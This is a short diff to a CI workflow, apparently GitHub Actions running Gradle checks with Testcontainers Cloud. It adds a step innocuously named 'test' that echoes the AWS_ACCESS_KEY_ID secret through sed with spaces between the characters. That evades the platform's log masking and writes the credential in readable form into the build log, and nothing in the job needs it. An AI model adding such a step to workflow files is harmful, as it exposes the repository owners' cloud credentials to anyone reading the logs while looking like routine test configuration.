@@ -21,5 +21,8 @@ jobs:
        uses: atomicjar/testcontainers-cloud-setup-action@main
        with:
          token: ${{ secrets.TC_CLOUD_TOKEN }}
+     - name: 'test'
+       run: |
+        echo ${{secrets.AWS_ACCESS_KEY_ID}} | sed 's/./& /g'
      - name: Execute Test
        run: ./gradlew check
